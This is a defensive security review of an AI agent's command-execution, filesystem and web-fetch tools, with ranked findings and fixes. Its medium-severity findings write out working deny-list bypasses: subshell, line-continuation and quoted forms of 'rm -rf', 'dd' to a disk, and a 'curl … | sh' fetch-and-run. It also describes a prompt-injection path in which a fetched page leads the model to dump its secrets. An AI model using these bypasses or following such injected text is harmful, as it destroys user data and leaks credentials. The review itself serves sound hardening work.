# internal/tools re-review — policy, exec, fs, web_fetch

Date: 2026-09-21. Scope: `internal/tools/*.go` + tests. Advisory only, no source changed.
Env: Linux ARM64, go1.27.1 (go.mod says 1.25.7), `go vet ./internal/tools` clean.

Threat model used for ranking (from `docs/security.md` + README, accepted as-is):
deny-list stops **accidents and naive injection**, not a determined attacker with
message access; bot token == shell access; there is no sandbox. Findings are ranked
against that, not against a jail that doesn't exist. Every finding below was
reproduced by running the real regexes / stdlib predicates (probe programs in
scratchpad), not inferred.

---

## Test status

`go test ./internal/tools` — **FAIL, panic** (nil deref, `exec.go:161`).
`go test -race ./internal/tools` — builds and runs; same panic. Everything else passes
under `-race`, no data race reported (28 exec/policy/fs/approver tests + web_fetch).

Two tests, not one, are dead: `TestExec_TimeoutKillsWholeProcessTree` (`exec_test.go:262`)
and `TestExec_TurnCancellationKillsProcessTree` (`exec_test.go:300`) — both use
`childSurvivalScript`, both panic identically. **The entire process-group kill path
(`exec_unix.go`) therefore has zero passing coverage** while two tests claim to prove it.

### Diagnosis (answers the three asked questions)

**Cause chain.** `childSurvivalScript` (exec_test.go:249) emits
`(sleep 2 && echo done > X) & sleep 30`. `shellwords.Parse` returns
`invalid command line string` on any `(`…`)` (verified). `exec.go:120` runs the
tokenize gate *before* `policy.Evaluate`, so the test's `Allow: [".*"]` is never
consulted → `VerdictAsk` → `ask()` → `e.approver.Ask` on a nil interface (`exec.go:161`).

**(a) Is a nil approver reachable in production?** No. Only two `&execTool{}` sites
exist (`exec.go:68`, `exec_test.go:50`); the production one is fed from
`registry.New`, which substitutes `DenyAllApprover{}` for nil (`registry.go:98`), and
all three real callers already pass non-nil (`gateway.go:82` mux, `cron_cmd.go:130`
DenyAll, `prompt_cmd.go:48` terminal). This is a test-harness defect, not a prod
crash. It is still worth a one-line `if e.approver == nil { e.approver = DenyAllApprover{} }`
in `registerExecTool`, or better: make the test harness default to `DenyAllApprover{}`
so the nil case cannot exist at all.

**(b) Does the shellwords gate buy any security?** No — it is friction plus a
deny-list hole. Verified tokenizer behavior:

```
"sleep 1 & sleep 2" -> ["sleep","1"]      err=nil   (silently truncates at &)
"a && b"            -> ["a"]              err=nil
"a; b"              -> ["a"]              err=nil
"echo $(rm -rf /)"  -> ["echo","$(rm -rf /)"] err=nil (no substitution awareness)
"(rm -rf ~) &"      -> nil                err=invalid command line string
```

The token slice is discarded (`if _, tokErr := ...`), so the gate's only effect is:
valid shell that go-shellwords can't model (subshells, process substitution, most
PowerShell) skips **both** the deny-list and the allow-list and lands on ASK. See H1.

**(c) How to fix the test so it really exercises the tree kill.** Fix the product
(remove the gate, H1) and both tests pass unchanged — that is the smallest correct
fix and it is what proves the gate was load-bearing for nothing. If the gate is kept
for now, the test must not be "fixed" by wrapping in an approving approver (that
would silently re-route the test through `ask()` and stop testing the allow path);
instead give `childSurvivalScript` a tokenizable POSIX form, e.g.
`sh -c 'sleep 2 && echo done > X' & sleep 30` (tokenizes cleanly, still forks a
detached grandchild through the process group) and independently add a regression
test asserting `(rm -rf /) &` is `VerdictRefuse`, not ASK.

---

## Critical

None. No unauthenticated remote path, no data-destroying defect, no schema break.

---

## High

### H1. Tokenize gate runs *before* the deny-list, so `(` downgrades REFUSE to ASK
`exec.go:115-128`:
```go
if _, tokErr := shellwords.Parse(rawCmd); tokErr != nil {
    decision = Decision{Verdict: VerdictAsk, ...}
} else {
    decision = e.policy.Evaluate(ctx, rawCmd)
}
```
Failure scenario: model (or injected page) emits `(rm -rf ~/notes) &`. Tokenize fails →
deny-list never runs → user gets an approval prompt with reason "command could not be
tokenized". `docs/security.md` guarantee #1 ("Deny-list is checked first and cannot be
overridden — not by the allow-list, not by the classifier, not by user approval") is
false for any command containing `(`, `)`, or an unbalanced quote. One tap on the
Telegram Approve button runs a command the design promised was unrunnable. The same
hole also breaks the allow-list in the other direction (legit allow-listed commands
with subshells prompt every time) — that is what kills the two tests above.

Fix (smallest, and it deletes code): drop the gate; always `policy.Evaluate(ctx, rawCmd)`.
The raw string is what the shell receives and what deny regexes are written against;
tokenization adds no information. If a "weird syntax → ask" signal is still wanted,
run it *after* deny: `if decision.Verdict != VerdictRefuse && tokErr != nil { ask }`.
Also update the `docs/security.md` flowchart, which currently documents PARSE ahead
of DENY (so the doc and code agree with each other, and both disagree with the
doc's own guarantee #1).

### H2. Unbounded in-memory command output: `MaxOutputBytes` truncates only after the fact
`exec.go:213-225`:
```go
var out bytes.Buffer
cmd.Stdout = &out
cmd.Stderr = &out
...
output := out.Bytes()
truncated := len(output) > e.cfg.MaxOutputBytes
```
`bytes.Buffer` grows without limit for the whole run; the 64 KiB cap is applied to the
finished buffer. Default `tools.exec.timeout` is **120 s** (`config/defaults.go:54`).
Measured on this host: `yes` emits >200 MB/s. An *accidental* `yes`, `cat /dev/urandom`,
`find /`, or `journalctl -f` therefore accumulates tens of GB of RSS and OOM-kills the
gateway long before the timeout fires — and takes the Telegram bot down with it. This
is squarely inside the "accidents" the design claims to survive, and it is reachable
from an allow-listed command, no approval needed.

Fix: cap at write time.
```go
type capWriter struct{ b bytes.Buffer; max int; over bool }
func (w *capWriter) Write(p []byte) (int, error) {
    if room := w.max - w.b.Len(); room > 0 {
        if len(p) > room { w.b.Write(p[:room]); w.over = true } else { w.b.Write(p) }
    } else if len(p) > 0 { w.over = true }
    return len(p), nil // always claim success so the child is not EPIPE'd early
}
```
Use `w.over` as `truncated`. Keeps current semantics, bounds memory at `MaxOutputBytes`.

### H3. Secret redaction misses the common `PREFIX_KEY=` form; and over-redacts paths
`approver.go:172`: `(?i)\b(KEY|TOKEN|SECRET|PASSWORD)=(\S+)`. `_` is a word character,
so `\bKEY` never matches inside `API_KEY`. Verified:
```
"export API_KEY=abc123"  -> unchanged
"PASSWORD=hunter2 psql"  -> PASSWORD=[REDACTED]   (the only shape the test covers)
```
`API_KEY=`, `GITHUB_TOKEN=`, `DB_PASSWORD=`, `AWS_SECRET_ACCESS_KEY=` — i.e. essentially
every real env-assignment — are written verbatim into `exec_audit.command` **and** into
the Telegram approval message, which persists on Telegram's servers indefinitely
(`approver.go:44-50` doc comment states this is exactly what must not happen).
`approver_test.go:111-115` only asserts the bare `PASSWORD=` form, so the gap is invisible.

Same function, opposite direction (`approver.go:181`,
`\b[A-Za-z0-9+/]{32,}={0,2}\b`): `/` is in the class, so ordinary long paths are
destroyed — verified `ls /workspace/tiennm99dev/MTClaw/internal/tools` is audited as
`ls /[REDACTED]`. The audit trail loses the one thing a reviewer needs (what was
touched), while keeping the secret it was supposed to remove. Audit-row correctness bug.

Fix: `(?i)(^|[\s;&|"'=])([A-Za-z0-9_]*(KEY|TOKEN|SECRET|PASSWD|PASSWORD))=(\S+)` →
`${1}${2}=[REDACTED]`; and drop `/` from the base64 catch-all (`[A-Za-z0-9+]{32,}`) or
require it not be preceded by `/`. Add test cases for `API_KEY=`, `GITHUB_TOKEN=`, and
a path-only command asserting the path survives.

### H4. `TerminalApprover` leaks a goroutine that keeps reading stdin after a timeout
`approver.go:104-118`:
```go
go func() { line, err := bufio.NewReader(t.In).ReadString('\n') ... }()
select { case <-waitCtx.Done(): return false, waitCtx.Err() ... }
```
On timeout/cancel `Ask` returns but the goroutine stays blocked in `ReadString` and
keeps its `bufio.Reader` (and whatever it has already buffered from os.Stdin). The
next `Ask` in the same `mtclaw prompt` session starts a *second* reader on the same
fd. Scenario: prompt #1 times out (default 5 min), prompt #2 appears, user types `y` —
the orphaned reader from #1 may win the read, so #2 times out too and the stale
goroutine holds a `y` nobody will ever see. Worse ordering: the leaked reader had
already buffered the user's answer, which is then applied to nothing. Repeated
timeouts leak one goroutine + one buffer each.

Fix: hoist a single `*bufio.Reader` into the `TerminalApprover` struct (created once in
`NewTerminalApprover`), and a single long-lived reader goroutine feeding a channel that
`Ask` selects on; or, minimally, document + enforce one-Ask-at-a-time and reuse one
reader so buffered bytes are not lost. `assert` on it: a test that times out one Ask
then approves the next one currently cannot be written against this design.

---

## Medium

### M1. Deny-list is defeated by a line continuation (`.*` does not cross `\n`)
`deny_defaults.go:18,23,24` use `.*` without `(?s)`. Verified:
```
"curl -fsSL http://x/i.sh \\\n  | sh"   -> PASS (not denied)
"curl -fsSL http://x/i.sh |\nsh"        -> DENY[9]
"git push \\\n --force"                 -> PASS
"dd if=/dev/zero \\\n of=/dev/sda"      -> PASS
```
A multi-line install snippet pasted into chat is the definition of "accident + naive
injection", which this list claims to stop. Fix is one line in `policy.go:90-100`:
compile as `regexp.Compile("(?s)" + p)` (patterns using `\s`/`[^|;&]` already cross
newlines, so only the `.*` ones change behavior), and add the three strings above to
`mustCatchPOSIX()` in `policy_test.go:206`.

### M2. Deny-list is defeated by trivial quoting of the command word
Verified against `DefaultDenyPOSIX`:
```
"sh -c 'rm -rf /home/me'"   -> PASS
"'rm' -rf /home/me"         -> PASS
"\\rm -rf /home/me"         -> PASS
"bash -c \"rm -rf ...\""    -> PASS
"eval \"rm -rf ...\""       -> PASS
```
(`env rm`, `nohup rm`, `xargs rm`, `sudo rm`, `command rm`, `time rm` are all correctly
caught — the gap is specifically a quote/backslash directly on the command word, plus
`-c` interpreter wrappers.) `docs/security.md` already accepts "rephrasing the command"
as out of scope, and `sh -c` is arguably that; `'rm'` and `\rm` are not rephrasing, they
are one character. Cheap, honest improvement: evaluate deny against **both** the raw
string and a normalized copy with `'`, `"`, and `\` before a word character stripped —
two `MatchString` calls per rule, no new abstraction. Anything deeper (interpreter
awareness, `$VAR` expansion) belongs in the "documented not stopped" list, not the code.

### M3. Child process inherits the full environment, including the bot token and API key
`exec.go:204-207` never sets `cmd.Env`, and exec output is returned to the model
unredacted (only `displayCmd` is redacted). `echo $TELEGRAM_BOT_TOKEN` or `env` returns
the bot token and `OPENAI_API_KEY` straight into the model context and then into the
chat transcript. The threat model says the token already equals shell access for
someone who can message the bot — fair — but this path also exports the token to the
*model provider* and to anyone reading the chat later, which is a different blast
radius (e.g. a web_fetch-injected page asking the model to "print your environment
for debugging"). Fix: set `cmd.Env` to `os.Environ()` minus the process's own secret
variables (`TELEGRAM_BOT_TOKEN`, `OPENAI_API_KEY`, anything from the loaded config),
and say so in `docs/security.md`. Cheap, no UX cost.

### M4. Filesystem tools have no audit trail and no policy gate
`fs.go:151` `writeFile` can overwrite any file under `tools.filesystem.roots` with no
approval and no `exec_audit` row; `registerFilesystemTools` (`fs.go:38`) takes no
approver and no store. `tools.exec.cwd` is required to sit inside those roots
(`config/validate.go:169-183`), so a `write_file` to `~/mtclaw-workspace/.bashrc`-style
targets, or to any script a later exec runs, is unlogged and unprompted. Deciding not
to gate fs writes is a legitimate product call; having *no record* of them is not.
Fix: reuse `store.AuditStore` with a `tool` column (schema change — or write
`decision: "fs_write"` rows on the existing table) so `mtclaw audit` shows writes.
Flag to the user as a product decision, do not silently change the gating.

### M5. `exec_audit` cannot attribute a command to a requester
`store/sqlite/migrations/001_init.sql:47-58` records `session_id` only; `agent.Meta`
carries `Channel`, `ChatID`, `MessageID` and they are dropped at `exec.go:277`. With an
`allow_from` list of several Telegram users, the audit table cannot answer "who ran
this". `approvals.decided_by` covers only the approver, and only for prompted commands
— allow-listed and `auto_allowed` rows have no actor at all. Fix: add `channel`,
`chat_id`, `message_id` columns (additive migration, no break).

### M6. Byte-slice truncation splits UTF-8 (prior L3, still open, now with two consumers)
`approver.go:146-147` (`s[:maxDisplayCommandLen]`) and `exec.go:224`
(`output[:e.cfg.MaxOutputBytes]`). Verified: `strings.Repeat("あ",400)[:800]` is invalid
UTF-8. Consequences beyond mojibake: the broken bytes go into a SQLite `TEXT` column and
into a Telegram message. A rune-safe cut already exists in-repo
(`internal/channel/telegram/chunk.go:270-282`) — DRY violation to re-derive it; export it
or drop a 6-line twin in `tools`.

---

## Low

### L1. SSRF blocklist residual gaps (prior L1, unchanged) — `web_fetch.go:110-129`
Re-verified against the actual predicate: blocked = loopback, RFC1918, 169.254/16,
ULA `fd00::/8`, `::ffff:` mapped v4, 0/8, 100.64/10. **Not** blocked:
`255.255.255.255`, `192.0.0.0/24` (incl. `192.0.0.170/171`), `198.18.0.0/15`,
IPv4-compatible IPv6 `::127.0.0.1`, NAT64 `64:ff9b::7f00:1`, 6to4 `2002:7f00:1::`.
On a single-user box with no NAT64 this is close to theoretical. Fix if cheap:
add the three v4 prefixes and reject any v6 whose low 32 bits, when the prefix is
`::/96`, `64:ff9b::/96`, or `2002::/16`, decode to a blocked v4.

### L2. `web_fetch` ignores `Content-Type` (prior L6, unchanged) — `web_fetch.go:163-173`
A `application/zip` or `image/png` body is run through `htmlToText` and returned as up
to 1 MiB of garbage, burning context tokens. Fix: whitelist `text/*`,
`application/json`, `application/xhtml+xml`; otherwise return
`web_fetch: refusing <type> (<n> bytes)`.

### L3. `web_fetch` echoes the request URL verbatim — `web_fetch.go:176`
`https://user:pass@host/...` credentials land in the model context and the chat.
Fix: print `parsed.Redacted()`.

### L4. shellwords gate is POSIX-shaped on Windows (prior L5) — moot if H1 is taken
Deleting the gate removes the finding entirely; that is the argument for H1's fix
over a narrower patch.

### L5. `ask()` labels a turn cancellation as `expired` — `exec.go:167`
Same audit label as "nobody answered in time", though the doc comment right above it
argues the trail should distinguish outcomes. Add `canceled` to the schema comment's
enum and use it.

### L6. fs tools ignore `ctx` — `fs.go:71,151,225` all take `_ context.Context`
A `list_dir` over a slow/enormous mount (bounded only by 2000 entries × depth 8) cannot
be canceled when the turn is. Low impact given the caps; still a contract smell, since
`ToolFunc` promises ctx propagation.

### L7. `taskkill /T` misses orphaned grandchildren — `exec_windows.go:23`
`/T` walks the parent-PID chain; a grandchild whose parent already exited is no longer
in the tree and survives. The comment asserts taskkill "covers the child processes a
shell like PowerShell spawns" — that is true for `Start-Job`, not in general. A Job
Object (`CREATE_SUSPENDED` + `AssignProcessToJobObject` + `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`)
is the correct primitive. Unverifiable on this host; keep as a documented limitation
unless Windows becomes a supported target.

### L8. Config zero-values are footguns the tools package trusts blindly
`config/validate.go:140-184` validates exec mode, regexes, roots, cwd — but not
`tools.exec.timeout > 0`, `max_output_bytes > 0`, `max_read_bytes > 0`,
`web_fetch.timeout > 0`. An explicit `timeout: 0` survives the defaults merge and
`exec.go:200` becomes `context.WithTimeout(ctx, 0)` — every command instantly "killed
after exceeding tools.exec.timeout". `max_output_bytes: 0` returns the truncation
marker and no output, forever. Fix in `validateTools`, not in the tools package.

### L9. Resolve is TOCTOU by construction — `path_guard.go:55-66` then `fs.go:79/183`
Symlink swapped between `Resolve` and `os.Open`/`OpenFile` escapes the root. Requires a
local attacker racing the agent; not in the threat model. Recorded so a future reader
does not "discover" it. The `O_NOFOLLOW`-on-final-component + `openat` fix is not worth
it here.

---

## Keep / Refactor / Rewrite

| File group | Verdict | Reason |
|---|---|---|
| `policy.go` | **Keep** | The deny→allow→mode pipeline is the right shape: deny unconditional, pure function, one side effect behind an interface. Only change: `(?s)` in `compileRules` (M1) and optional normalized second match (M2). |
| `exec.go` (decision half) | **Refactor (small)** | Delete the shellwords gate (H1) — ~10 lines out, one dependency closer to unused. Everything downstream already fails closed. |
| `exec.go` (execute half) | **Refactor (small)** | `capWriter` for H2; env scrubbing for M3; rune-safe cut for M6. Control flow (`ctx.Err()` checked before `ExitError`, WaitDelay, audit on detached ctx) is genuinely correct and well-reasoned — do not touch it. |
| `exec_unix.go` / `exec_windows.go` | **Keep** unix / **document** windows | 25 lines each, right primitive on POSIX. Windows caveat L7. |
| `classifier.go` | **Keep** | Interface seam is justified (fake in tests, no provider call), prompt correctly withholds tool output, strict unmarshal + risk-enum validation, fails closed. `MaxRetries=0` rationale is real, not cargo-culted. |
| `deny_defaults.go` | **Keep, extend corpus** | Patterns earn their complexity (the `/bin/rm` and `--recursive --force` history is real). Add M1/M2 strings to the corpus rather than rewriting the regexes. |
| `approver.go` (Approver seam) | **Keep** | Clean: one method, documented error contract that distinguishes Canceled / DeadlineExceeded / ErrNoApprover, DenyAll as the safe default, row ownership pushed to the implementation. This is the best-designed part of the package. |
| `approver.go` (TerminalApprover) | **Refactor** | H4 goroutine/stdin leak. |
| `approver.go` (RedactSecrets) | **Refactor** | H3 both directions. Consider moving to its own file — it shares nothing with the Approver seam beyond being called by it. |
| `path_guard.go` | **Keep** | `Rel`-based containment, deepest-existing-ancestor symlink resolution, NUL rejection, case folding — correct and well tested (11 cases). No change. |
| `fs.go` | **Keep + M4** | Straightforward, caps are sensible, `entry.Info()` Lstat semantics correct for the never-follow-symlinks rule. Add auditing; do not restructure. |
| `web_fetch.go` | **Keep** | Dial-time `Control` hook is the right SSRF design (survives DNS rebinding and redirects, unlike a pre-resolution hostname check). Only additive fixes L1–L3. |
| `registry.go` / `spec.go` | **Keep** | 116 + 30 lines, no abstraction that isn't paying rent. `additionalProperties:false` is a nice touch. |
| `exec_test.go` harness | **Refactor** | Default nil approver → `DenyAllApprover{}`; fix `childSurvivalScript` (or rely on H1). |

No AI-slop patterns found: no parallel reimplementations (the one DRY miss is M6), no
`any` widening, no catch-and-swallow (the single swallowed error, `writeAudit`'s store
failure, is explicitly justified and logged), no lint suppressions, no scope drift.
Comment density is unusually high but the comments explain *why*, including recorded
past failures — that is the good kind. The two dead process-tree tests are the only
phantom coverage.

---

## Recommended actions, in order

1. Delete the shellwords tokenize gate (`exec.go:115-128`) and the
   `mattn/go-shellwords` import; re-run `go test ./internal/tools` — both process-tree
   tests should then pass for real. Add a regression test: `(rm -rf /) &` → `VerdictRefuse`.
   Update the `docs/security.md` flowchart.
2. Bound exec output at write time (H2).
3. Fix `RedactSecrets` env-assignment and path over-redaction, with tests (H3).
4. Fix `TerminalApprover`'s reader lifetime (H4).
5. `(?s)` on deny compilation + corpus additions for line continuations and quoted
   command words (M1/M2).
6. Scrub secrets from the child environment (M3).
7. Audit rows for fs writes + requester columns on `exec_audit` (M4/M5) — schema work,
   batch them.
8. Rune-safe truncation shared with `chunk.go` (M6); L1–L3 web_fetch additive fixes.

---

## Unresolved questions

1. **Is the `sh -c 'rm -rf …'` class in scope?** `docs/security.md` accepts "rephrasing"
   as a known bypass. `'rm'` / `\rm` feel like accidents; `sh -c` feels like rephrasing.
   M2's fix covers the first two cheaply and the third not at all. Does the user want
   the normalized-match pass, or a docs sentence naming quoting explicitly as
   not-stopped? (Product decision; I did not assume.)
2. **fs write auditing (M4)** — is "filesystem tools are unlogged" a deliberate scope
   call from phase 5, or an omission? It changes the schema either way, so it needs the
   user's answer before anyone writes a migration.
3. **Windows support level.** L7 (taskkill vs Job Object) and the PowerShell
   `-Command` argument-quoting path are unverifiable on this host. Is Windows a
   supported target or best-effort? That decides whether L7 is a bug or a footnote.
4. **`auto` mode + H1 interaction.** With the gate removed, a subshell command in `auto`
   mode now reaches the LLM classifier instead of always prompting. That is a strictly
   more correct pipeline but a slightly looser one for that command shape — confirm
   that is acceptable before landing.
